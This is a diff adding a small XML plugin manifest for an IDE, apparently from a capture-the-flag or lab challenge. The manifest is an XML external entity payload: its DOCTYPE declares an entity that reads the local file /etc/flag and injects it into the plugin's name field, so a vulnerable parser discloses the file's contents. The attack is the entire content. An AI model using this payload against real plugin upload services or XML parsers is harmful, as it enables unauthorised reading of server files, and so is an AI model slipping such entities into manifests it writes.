@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ide-plugin [ <!ENTITY xxe SYSTEM "file:///etc/flag"> ]>
+<ide-plugin>
+    <name>&xxe;</name>
+    <id>org.plugin.package</id>
+    <version>1.123</version>
+</ide-plugin>
